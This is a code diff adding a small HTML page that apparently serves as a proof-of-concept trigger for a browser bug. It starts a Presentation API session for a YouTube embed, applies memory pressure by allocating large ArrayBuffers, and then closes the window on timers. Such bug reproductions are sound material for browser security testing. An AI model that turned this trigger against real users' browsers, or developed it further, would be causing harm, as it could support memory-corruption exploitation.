@@ -1,0 +1,41 @@
+
+<html>
+    <head>
+        <script>
+                const setAsyncTimeout = (cb, timeout = 0) => new Promise(resolve => {
+                    setTimeout(() => {
+                        cb();
+                        resolve();
+                    }, timeout);
+                });
+                const doStuffAsync = async () => {
+                    await setAsyncTimeout(() => {
+                        start();
+                    }, 2000);
+                    await setAsyncTimeout(() => {
+                        for(let i = 0; i < 0x20; i++){
+                            try{ new ArrayBuffer(0x1000000);}catch(e){};
+                        }
+                    }, 3000);
+                    await setAsyncTimeout(() => {
+                        window.close();
+                    }, 2000);
+                };
+                async function start(){
+                    // request = await new PresentationRequest("https://www.youtube.com/embed?listType=playlist&list=PLC77007E23FF423C6?param=true");
+                    request = await new PresentationRequest("https://www.youtube.com/embed/M7lc1UVf-VE?autoplay=1");
+                    await request.start().then(
+                        connection => {
+                            console.log(connection);
+                        }
+                    );
+                    setTimeout(() => {
+                        window.close();
+                    }, 5999);
+                }
+        </script>
+    </head>
+    <body>
+        <button id="abc" onclick="doStuffAsync()">Click me</button>
+    </body>
+</html>
